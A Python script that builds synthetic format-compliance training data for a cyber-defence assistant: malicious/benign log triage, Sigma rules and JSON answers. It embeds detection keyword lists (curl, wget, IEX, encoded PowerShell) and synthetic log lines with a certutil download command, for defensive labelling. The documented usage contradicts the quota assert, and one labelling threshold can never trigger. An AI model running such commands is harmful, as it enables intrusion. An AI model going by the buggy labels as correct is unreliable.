#!/usr/bin/env python3
"""build_format_set.py — author the v2 format-compliance set (F4).

v1's measured format failures: 73/120 triage answers never emitted the requested one-word verdict, and
0% of its Sigma drafts were schema-complete (6.7% were even valid YAML). Nothing in the corpus paired a
strict output contract with a compliant answer, so the model defaulted to prose.

Four contract types, compliant answers only: triage-one-word, sigma-rule, structured-json, yaml-report.
Sigma rules are written to parse and to be schema-complete, because that is the bar gate G-E will hold
v2 to — teaching the format with invalid examples would be self-defeating.

Usage:  python3 v2/build_format_set.py --out v2/data/format-compliance.jsonl --target 1500
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import sys
import uuid

SYS = ("You are a cyber-defence assistant. Follow the requested output format exactly: when a format "
       "is specified, the answer contains that format and nothing else.")

# A Sigma rule is only meaningful if its logsource matches the telemetry the goal names. The first
# version picked it at random and paired "persistence ... in file events" with an image-load source —
# 658 of 800 rules were semantically incoherent, which would have taught wrong detections (and directly
# undermined gate G-E). The logsource is now DERIVED from the goal's channel.
LOGSOURCE_BY_CHANNEL = {
    "process creation": [
        ("process_creation", "windows", "Image|endswith", ["\\powershell.exe", "\\cmd.exe",
                                                           "\\rundll32.exe", "\\wmic.exe",
                                                           "\\certutil.exe"]),
        ("process_creation", "linux", "CommandLine|contains", ["curl ", "wget ", "base64 -d",
                                                               "chmod +x"]),
    ],
    "file events": [
        ("file_event", "windows", "TargetFilename|endswith", [".lnk", ".hta", ".iso", ".vbs", ".js"]),
        ("file_event", "linux", "TargetFilename|endswith", ["/authorized_keys", "/.ssh/config"]),
    ],
    "registry writes": [
        ("registry_set", "windows", "TargetObject|contains", ["Run", "Services", "Winlogon"]),
    ],
    "DNS telemetry": [
        ("dns_query", "windows", "QueryName|endswith", [".duckdns.org", ".ngrok.io", ".top", ".xyz"]),
    ],
    "network connections": [
        ("network_connection", "windows", "DestinationPort", ["4444", "8080", "3389", "5985"]),
    ],
    "command-line auditing": [
        ("process_creation", "windows", "CommandLine|contains", ["-enc", "-nop", "-w hidden",
                                                                 "Invoke-Expression", "IEX("]),
    ],
}

LOGSOURCES = [
    ("process_creation", "windows", "Image|endswith", ["powershell.exe", "cmd.exe", "rundll32.exe"]),
    ("process_creation", "linux", "CommandLine|contains", ["curl ", "wget ", "base64 -d", "chmod +x"]),
    ("file_event", "windows", "TargetFilename|endswith", [".lnk", ".hta", ".iso", ".vbs", ".js"]),
    ("registry_set", "windows", "TargetObject|contains", ["Run", "Services", "Winlogon"]),
    ("dns_query", "windows", "QueryName|endswith", [".duckdns.org", ".ngrok.io", ".top", ".xyz"]),
    ("network_connection", "windows", "DestinationPort", ["4444", "8080", "3389", "5985"]),
    ("process_creation", "linux", "CommandLine|contains|all", ["crontab", "-e"]),
    ("file_event", "linux", "TargetFilename|endswith", ["/authorized_keys", "/.ssh/config"]),
    ("image_load", "windows", "ImageLoaded|endswith", [".dll", ".ocx"]),
    ("process_creation", "windows", "ParentImage|endswith", ["winword.exe", "excel.exe"]),
]

TECHNIQUES = ["T1059.001", "T1059.004", "T1105", "T1053.003", "T1547.001", "T1071.004", "T1021.001",
              "T1566.001", "T1204.002", "T1218.011", "T1003.001", "T1486", "T1070.004", "T1490"]
TACTICS = {"T1059": "Execution", "T1105": "Command and Control", "T1053": "Persistence",
           "T1547": "Persistence", "T1071": "Command and Control", "T1021": "Lateral Movement",
           "T1566": "Initial Access", "T1204": "Execution", "T1218": "Defense Evasion",
           "T1003": "Credential Access", "T1486": "Impact", "T1070": "Defense Evasion",
           "T1490": "Impact"}
LEVELS = ["informational", "low", "medium", "high", "critical"]
HANDPRINTS = ["encoded command", "hidden window", "unsigned binary", "temp-directory execution",
              "parent-child mismatch", "network fetch", "registry persistence", "credential access",
              "log clearing", "shadow copy deletion", "scheduled task creation", "service creation"]
CHANNELS = ["process creation", "file events", "registry writes", "DNS telemetry",
            "network connections", "command-line auditing"]
CONTEXTS = ["a Windows estate", "a Linux fleet", "a hybrid cloud tenant",
            "an OT network", "a managed service provider", "a financial institution",
            "a healthcare provider", "a Kubernetes platform", "an email gateway",
            "an endpoint fleet"]
ACTIONS = ["obfuscated script execution", "payload download", "persistence installation",
           "privilege escalation", "credential dumping", "defence evasion", "data staging",
           "lateral movement", "impact preparation"]


# D3: the selection must express the handprint the prompt names, or the rule teaches arbitrary detection
HANDPRINT_SELECTION = {
    "encoded command": ("process_creation", "windows", "CommandLine|contains", "-enc"),
    "hidden window": ("process_creation", "windows", "CommandLine|contains", "-w hidden"),
    "unsigned binary": ("image_load", "windows", "Signed", "false"),
    "temp-directory execution": ("process_creation", "windows", "Image|contains", "\\Temp\\"),
    "parent-child mismatch": ("process_creation", "windows", "ParentImage|endswith", "winword.exe"),
    "network fetch": ("process_creation", "windows", "CommandLine|contains", "urlcache"),
    "registry persistence": ("registry_set", "windows", "TargetObject|contains", "CurrentVersion\\Run"),
    "credential access": ("process_creation", "windows", "CommandLine|contains", "lsass"),
    "log clearing": ("process_creation", "windows", "CommandLine|contains", "wevtutil cl"),
    "shadow copy deletion": ("process_creation", "windows", "CommandLine|contains", "delete shadows"),
    "scheduled task creation": ("process_creation", "windows", "CommandLine|contains", "schtasks"),
    "service creation": ("process_creation", "windows", "CommandLine|contains", "sc create"),
}


def selection_for(rng, goal, channel):
    for hp, sel in HANDPRINT_SELECTION.items():
        if hp in goal:
            return sel
    pool = LOGSOURCE_BY_CHANNEL.get(channel) or LOGSOURCES
    ls, product, field, values = rng.choice(pool)
    return ls, product, field, rng.choice(values)


def sigma_rule(rng, goal, technique, level, channel=None):
    ls, product, field, value = selection_for(rng, goal, channel)
    base = technique.split(".")[0]
    lines = [
        "title: " + goal[:1].upper() + goal[1:],
        "id: " + str(uuid.UUID(int=rng.getrandbits(128))),
        "status: experimental",
        "description: Detects activity consistent with " + goal + ".",
        "references:",
        "  - https://attack.mitre.org/techniques/" + base + "/",
        "author: CyberGuard",
        "date: 2026/09/27",
        "tags:",
        "  - attack." + technique.lower(),
        "logsource:",
        "  product: " + product,
        "  category: " + ls,
        "detection:",
        "  selection:",
        "    " + field + ": '" + str(value) + "'",
        "  condition: selection",
        "falsepositives:",
        "  - Administrative tooling",
        "level: " + level,
    ]
    return "\n".join(lines) + "\n"


def gen_log_line(rng):
    host = "ws-%d" % rng.randint(1000, 9999)
    user = rng.choice(["svc_backup", "jdoe", "admin2", "svc_etl", "mchen", "helpdesk1", "root"])
    ip = "10.%d.%d.%d" % (rng.randint(0, 40), rng.randint(0, 255), rng.randint(1, 254))
    port = rng.choice([445, 3389, 5985, 8080, 4444, 22, 443, 53])
    hexish = "".join(rng.choice("ABCDEF0123456789") for _ in range(16))
    t = rng.randint(0, 9)
    if t == 0:
        return "host=%s user=%s EventID=4624 LogonType=3 src=%s result=Success" % (host, user, ip), "benign"
    if t == 1:
        return "host=%s parent=winword.exe child=powershell.exe args=-enc %s" % (host, hexish), "malicious"
    if t == 2:
        return "host=%s cmd=certutil -urlcache -split -f http://%s/p.bin p.bin" % (host, ip), "malicious"
    if t == 3:
        return "host=%s file_event path=/tmp/.x%d mode=0755" % (host, rng.randint(100, 999)), "malicious"
    if t == 4:
        return "host=%s backup_agent transferred %d GB to the file server backup share overnight" % (
            host, rng.randint(1, 40)), "benign"
    if t == 5:
        return "host=%s registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc%d.exe" % (
            host, rng.randint(1, 99)), "malicious"
    if t == 6:
        return "host=%s av signature update completed for %d endpoints" % (
            host, rng.randint(50, 2000)), "benign"
    if t == 7:
        d = "".join(rng.choice("abcdef0123456789") for _ in range(28))
        return "host=%s dns_query name=%s.duckdns.org" % (host, d), "malicious"
    if t == 8:
        return "host=%s user=%s ssh login key=authorized src=%s action=accept" % (host, user, ip), "benign"
    # D3: a random label here taught the model that identical telemetry means either thing
    bytes_, dur = rng.randint(1000, 900000), rng.randint(1, 600)
    label = "malicious" if (port in (4444, 5985) or bytes_ > 500000_0) else "benign"
    return "host=%s net_conn dst=%s:%d bytes=%d duration=%ds" % (host, ip, port, bytes_, dur), label


def sigma_goal(rng):
    """Return (goal_text, channel) so the rule's logsource can be derived rather than guessed."""
    channel = rng.choice(CHANNELS)
    return ("detect %s identified by %s in %s"
            % (rng.choice(ACTIONS), rng.choice(HANDPRINTS), channel)), channel


def build(target, seed):
    rng = random.Random(seed)
    quotas = {"triage-one-word": 600, "sigma-rule": 400, "structured-json": 300}   # C2: yaml-report cut
    assert sum(quotas.values()) == target, "quotas must sum to the target"
    rows, seen = [], set()

    def add(user, assistant, kind):
        k = " ".join(user.lower().split())
        if k in seen:
            return False
        seen.add(k)
        rows.append({"system": SYS, "user": user, "assistant": assistant, "meta": {"kind": kind}})
        return True

    tri = [
        "Answer with exactly one word - _malicious_ or _benign_: {line}",
        "Classify as _malicious_ or _benign_. One word only.\n{line}",
        "One-word verdict required (_malicious_ or _benign_).\n{line}",
        "Is this malicious or benign? Reply with a single word.\n{line}",
        "Verdict (one word: malicious or benign):\n{line}",
    ]
    n = a = 0
    while n < quotas["triage-one-word"] and a < 300000:
        a += 1
        line, label = gen_log_line(rng)
        n += add(rng.choice(tri).format(line=line), label, "triage-one-word")

    sig = [
        "Write a Sigma rule that would {g}. Output only the YAML, with a complete schema.",
        "Produce a schema-complete Sigma rule to {g}. YAML only.",
        "Draft Sigma YAML that would {g}. Output the rule and nothing else.",
        "Give me a Sigma rule for: {g}. Output only valid YAML.",
        "Rule please: {g}. YAML only, complete schema.",
    ]
    n = a = 0
    while n < quotas["sigma-rule"] and a < 300000:
        a += 1
        g, chan = sigma_goal(rng)
        n += add(rng.choice(sig).format(g=g),
                 sigma_rule(rng, g, rng.choice(TECHNIQUES), rng.choice(LEVELS), chan), "sigma-rule")

    n = a = 0
    while n < quotas["structured-json"] and a < 300000:
        a += 1
        tech = rng.choice(TECHNIQUES)
        tactic = TACTICS.get(tech.split(".")[0], "Execution")
        ctx = rng.choice(CONTEXTS)
        roll = rng.random()
        if roll < 0.34:
            obj = {"technique": tech, "tactic": tactic, "detection": rng.choice(HANDPRINTS)}
            user = ("Return JSON with exactly the keys 'technique', 'tactic' and 'detection' for "
                    + tech + " in " + ctx + ". Output only the JSON object.")
        elif roll < 0.67:
            obj = {"control": rng.choice(["MFA", "patching", "segmentation", "logging", "EDR"]),
                   "technique": tech, "priority": rng.choice(["high", "medium", "low"])}
            user = ("Return JSON with exactly the keys 'control', 'technique' and 'priority' mitigating "
                    + tech + " in " + ctx + ". Output only the JSON object.")
        else:
            obj = {"finding": rng.choice(HANDPRINTS), "technique": tech,
                   "false_positive": rng.choice(["none known", "admin tooling", "backup job"])}
            user = ("Return JSON with exactly the keys 'finding', 'technique' and 'false_positive' for "
                    + ctx + " reporting on " + tech + ". Output only the JSON object.")
        n += add(user, json.dumps(obj), "structured-json")

    n = a = 0
    while False:   # C1/C2 (over-engineering review): category cut
        a += 1
        k = rng.randint(2, 4)
        picks = rng.sample(HANDPRINTS, k)
        body = "detections:\n" + "".join(
            "  - name: " + x.replace(" ", "-") + "\n    signal: " + rng.choice(CHANNELS) + "\n"
            for x in picks)
        user = ("List %d detection ideas covering %s as YAML with the key 'detections' containing "
                "mappings with keys 'name' and 'signal'. Output only the YAML."
                % (k, "; ".join(picks)))
        n += add(user, body.rstrip("\n"), "yaml-report")

    rng.shuffle(rows)
    return rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="v2/data/format-compliance.jsonl")
    ap.add_argument("--target", type=int, default=1300)
    ap.add_argument("--seed", type=int, default=0)
    args = ap.parse_args()
    rows = build(args.target, args.seed)
    if len(rows) < args.target:
        print("REFUSING to call this complete: generated %d, target %d" % (len(rows), args.target),
              file=sys.stderr)
    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")
    kinds = {}
    for r in rows:
        kinds[r["meta"]["kind"]] = kinds.get(r["meta"]["kind"], 0) + 1
    receipt = {"rows": len(rows), "target": args.target, "seed": args.seed, "kinds": kinds,
               "sha256": hashlib.sha256(open(args.out, "rb").read()).hexdigest()}
    with open(args.out.replace(".jsonl", ".receipt.json"), "w", encoding="utf-8") as fh:
        json.dump(receipt, fh, indent=2)
    print("WROTE %s: %d rows" % (args.out, len(rows)))
    for k, v in sorted(kinds.items()):
        print("   %-18s %d" % (k, v))
    return 0 if len(rows) >= args.target else 1


if __name__ == "__main__":
    sys.exit(main())
